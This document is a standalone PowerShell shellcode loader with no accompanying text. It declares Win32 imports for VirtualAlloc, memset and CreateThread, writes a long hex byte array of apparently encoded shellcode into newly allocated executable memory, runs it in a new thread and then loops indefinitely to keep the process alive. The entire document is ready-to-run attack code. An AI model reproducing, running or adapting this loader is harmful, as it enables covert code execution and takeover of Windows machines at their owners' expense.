
$1c9 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $1c9 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x90,0x89,0x14,0x7a,0xda,0xc9,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x47,0x31,0x43,0x13,0x03,0x43,0x13,0x83,0xc3,0x94,0x6b,0xe1,0x86,0x7c,0xe9,0x0a,0x77,0x7c,0x8e,0x83,0x92,0x4d,0x8e,0xf0,0xd7,0xfd,0x3e,0x72,0xb5,0xf1,0xb5,0xd6,0x2e,0x82,0xb8,0xfe,0x41,0x23,0x76,0xd9,0x6c,0xb4,0x2b,0x19,0xee,0x36,0x36,0x4e,0xd0,0x07,0xf9,0x83,0x11,0x40,0xe4,0x6e,0x43,0x19,0x62,0xdc,0x74,0x2e,0x3e,0xdd,0xff,0x7c,0xae,0x65,0xe3,0x34,0xd1,0x44,0xb2,0x4f,0x88,0x46,0x34,0x9c,0xa0,0xce,0x2e,0xc1,0x8d,0x99,0xc5,0x31,0x79,0x18,0x0c,0x08,0x82,0xb7,0x71,0xa5,0x71,0xc9,0xb6,0x01,0x6a,0xbc,0xce,0x72,0x17,0xc7,0x14,0x09,0xc3,0x42,0x8f,0xa9,0x80,0xf5,0x6b,0x48,0x44,0x63,0xff,0x46,0x21,0xe7,0xa7,0x4a,0xb4,0x24,0xdc,0x76,0x3d,0xcb,0x33,0xff,0x05,0xe8,0x97,0xa4,0xde,0x91,0x8e,0x00,0xb0,0xae,0xd1,0xeb,0x6d,0x0b,0x99,0x01,0x79,0x26,0xc0,0x4d,0x4e,0x0b,0xfb,0x8d,0xd8,0x1c,0x88,0xbf,0x47,0xb7,0x06,0xf3,0x00,0x11,0xd0,0xf4,0x3a,0xe5,0x4e,0x0b,0xc5,0x16,0x46,0xcf,0x91,0x46,0xf0,0xe6,0x99,0x0c,0x00,0x07,0x4c,0xb8,0x05,0x9f,0x42,0x0a,0xb9,0x98,0xf5,0x76,0xc5,0x27,0xbd,0xfe,0x23,0x77,0x91,0x50,0xfc,0x37,0x41,0x11,0xac,0xdf,0x8b,0x9e,0x93,0xff,0xb3,0x74,0xbc,0x95,0x5b,0x21,0x94,0x01,0xc5,0x68,0x6e,0xb0,0x0a,0xa7,0x0a,0xf2,0x81,0x44,0xea,0xbc,0x61,0x20,0xf8,0x28,0x82,0x7f,0xa2,0xfe,0x9d,0x55,0xc9,0xfe,0x0b,0x52,0x58,0xa9,0xa3,0x58,0xbd,0x9d,0x6b,0xa2,0xe8,0x96,0xa2,0x36,0x53,0xc0,0xca,0xd6,0x53,0x10,0x9d,0xbc,0x53,0x78,0x79,0xe5,0x07,0x9d,0x86,0x30,0x34,0x0e,0x13,0xbb,0x6d,0xe3,0xb4,0xd3,0x93,0xda,0xf3,0x7b,0x6b,0x09,0x02,0x47,0xba,0x77,0x70,0xa9,0x7e;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$xNze=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($xNze.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$xNze,0,0,0);for (;;){Start-sleep 60};
